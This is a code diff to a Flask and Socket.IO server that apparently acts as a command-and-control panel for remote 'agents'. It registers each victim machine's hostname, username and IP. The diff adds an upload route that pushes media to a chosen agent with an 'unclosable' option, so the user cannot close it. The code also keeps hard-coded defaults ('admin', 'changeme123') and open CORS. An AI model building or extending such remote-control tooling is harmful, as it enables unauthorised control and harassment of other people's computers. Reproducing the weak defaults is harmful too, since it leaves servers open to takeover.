@@ -1,24 +1,63 @@
 from flask import Flask, render_template, request, jsonify
 from flask_socketio import SocketIO, emit, join_room, disconnect
 from datetime import datetime
-import uuid, os
+import uuid, os, base64
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'changeme123'
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
+app.config['MAX_CONTENT_LENGTH'] = 64 * 1024 * 1024   # 64 MB HTTP upload limit
+
+socketio = SocketIO(
+    app,
+    cors_allowed_origins="*",
+    async_mode='threading',
+    max_http_buffer_size=64 * 1024 * 1024,
+)
 
 # ── Dashboard password ────────────────────────────────────────
-# Set via env var DASHBOARD_PASS, default 'admin'
 DASHBOARD_PASS = os.environ.get('DASHBOARD_PASS', 'admin')
-authed_sids = set()   # socket sids that have authenticated
+authed_sids = set()
 
-clients = {}          # client_id -> info dict
-agent_sids = {}       # client_id -> socket sid
+clients    = {}
+agent_sids = {}
 dashboard_sids = set()
 
 @app.route('/')
 def index():
     return render_template('index.html')
+
+# ── HTTP media upload ─────────────────────────────────────────
+# Dashboard POSTs the file here over plain HTTP instead of the
+# WebSocket, so large files never touch the WS message-size limit.
+@app.route('/upload_media/<client_id>', methods=['POST'])
+def upload_media(client_id):
+    token = request.headers.get('X-Dashboard-Token', '')
+    if token != DASHBOARD_PASS:
+        return jsonify({'status': 'error', 'msg': 'Unauthorized'}), 403
+
+    if client_id not in agent_sids:
+        return jsonify({'status': 'error', 'msg': 'Agent not connected'}), 404
+
+    f = request.files.get('file')
+    if not f:
+        return jsonify({'status': 'error', 'msg': 'No file provided'}), 400
+
+    ext        = request.form.get('ext', 'mp3')
+    unclosable = request.form.get('unclosable', 'false').lower() == 'true'
+    rid        = request.form.get('rid', str(uuid.uuid4()))
+
+    data_b64 = base64.b64encode(f.read()).decode()
+
+    socketio.emit('cmd', {
+        'client_id':  client_id,
+        'action':     'play_media',
+        'rid':        rid,
+        'data':       data_b64,
+        'ext':        ext,
+        'unclosable': unclosable,
+    }, to=agent_sids[client_id])
+
+    return jsonify({'status': 'ok', 'rid': rid})
 
 # ── Agent events ─────────────────────────────────────────────
 
@@ -45,15 +84,15 @@ def handle_agent_register(data):
     agent_sids[cid] = request.sid
     join_room(f'agent_{cid}')
     clients[cid] = {
-        'id': cid,
-        'hostname': data.get('hostname', 'Unknown'),
-        'ip': request.remote_addr,
-        'username': data.get('username', 'Unknown'),
-        'platform': data.get('platform', 'Unknown'),
+        'id':           cid,
+        'hostname':     data.get('hostname',     'Unknown'),
+        'ip':           request.remote_addr,
+        'username':     data.get('username',     'Unknown'),
+        'platform':     data.get('platform',     'Unknown'),
         'connected_at': data.get('connected_at', datetime.now().isoformat()),
-        'last_seen': datetime.now().isoformat(),
-        'status': 'online',
-        'sid': request.sid,
+        'last_seen':    datetime.now().isoformat(),
+        'status':       'online',
+        'sid':          request.sid,
     }
     broadcast_clients()
 
